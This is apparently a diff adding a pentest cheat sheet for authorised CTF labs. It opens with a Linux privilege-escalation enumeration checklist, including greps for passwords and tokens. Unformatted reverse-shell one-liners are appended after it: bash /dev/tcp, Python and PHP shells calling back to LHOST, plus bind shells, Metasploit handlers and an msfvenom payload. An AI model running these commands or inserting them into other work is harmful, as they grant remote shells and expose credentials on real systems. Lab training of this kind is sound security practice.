@@ -1,0 +1,231 @@
+# Linux Shell Triage — Authorised CTFs
+
+## Stabilise the shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
+## Identify your position
+
+```bash
+whoami
+id
+hostname
+pwd
+cat /etc/os-release
+uname -a
+```
+
+## Check privileges first
+
+```bash
+sudo -l
+```
+
+Look for commands that can run as root.
+
+```bash
+groups
+```
+
+Pay attention to groups such as:
+
+```text
+sudo
+docker
+lxd
+adm
+disk
+```
+
+## Find SUID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Compare unusual binaries against GTFOBins, but only in the authorised lab context.
+
+## Find Linux capabilities
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+Look for capabilities assigned to interpreters, editors, or unusual binaries.
+
+## Check scheduled jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+```
+
+Look for root-owned scripts that your current user can modify.
+
+## Check running services and processes
+
+```bash
+ps auxww
+ss -lntup
+systemctl list-units --type=service --state=running
+```
+
+Ask:
+
+```text
+What is listening locally?
+Which process runs as root?
+Are configuration files readable?
+Is a privileged script writable?
+```
+
+## Search applications for secrets
+
+```bash
+find /var/www /opt /srv /home -type f 2>/dev/null
+```
+
+```bash
+grep -RniE "password|passwd|secret|token|api_key|DB_" /var/www /opt /home 2>/dev/null
+```
+
+Check history:
+
+```bash
+cat ~/.bash_history
+```
+
+## Find writable paths
+
+```bash
+find / -writable -type d 2>/dev/null
+```
+
+```bash
+find / -type f -writable 2>/dev/null
+```
+
+Focus on writable scripts, service files, cron files, and application directories.
+
+## Check containers
+
+```bash
+docker ps
+docker images
+```
+
+If your user belongs to the `docker` group, record that as a major finding.
+
+Check LXD:
+
+```bash
+lxc list
+```
+
+## Check mounted storage
+
+```bash
+mount
+lsblk
+df -h
+cat /etc/fstab
+```
+
+Look for mounted shares, backup directories, and unusual writable locations.
+
+## Inspect environment and path
+
+```bash
+env
+echo $PATH
+```
+
+A writable directory appearing early in `$PATH` can matter when privileged scripts call programs without absolute paths.
+
+## Monitor scheduled activity
+
+If the room provides `pspy`:
+
+```bash
+./pspy64
+```
+
+Watch for commands run automatically by root or another privileged user.
+
+## Record findings
+
+For every possible escalation path, write:
+
+```text
+Finding:
+Evidence:
+Required permissions:
+Likely impact:
+Recommended remediation:
+```
+
+## Decision order
+
+```text
+1. sudo -l
+2. groups
+3. SUID files
+4. capabilities
+5. cron jobs
+6. running processes
+7. writable scripts/directories
+8. application configuration
+9. containers
+10. kernel research
+```Listeners
+nc -lvnp 4444
+ncat -lvnp 4444
+rlwrap nc -lvnp 4444
+socat TCP-LISTEN:4444,reuseaddr,fork -
+Bash reverse shell
+Start the listener first:
+nc -lvnp 4444
+Run on the authorised Linux target:
+bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
+Python reverse shell
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+PHP reverse shell
+php -r '$s=fsockopen("LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+Bind shell
+Run on the authorised target:
+ncat -lvnp 4444 --exec /bin/bash
+Connect from Kali:
+ncat TARGET 4444
+A Socat bind shell:
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+Metasploit listener
+msfconsole -q
+Inside Metasploit:
+use exploit/multi/handler
+set payload linux/x64/shell_reverse_tcp
+set LHOST YOUR_TUN0_IP
+set LPORT 4444
+run
+Useful session commands:
+sessions -l
+sessions -i 1
+background
+Metasploit payload for a Linux lab target
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_TUN0_IP LPORT=4444 -f elf -o shell.elf
+Then start the matching handler before executing the payload:
+use exploit/multi/handler
+set payload linux/x64/shell_reverse_tcp
+set LHOST YOUR_TUN0_IP
+set LPORT 4444
+run
+Stabilise a shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Then:
+export TERM=xterm
+If the shell is awkward, press Ctrl+Z on Kali and run:
+stty raw -echo; fg
+Then press Enter.
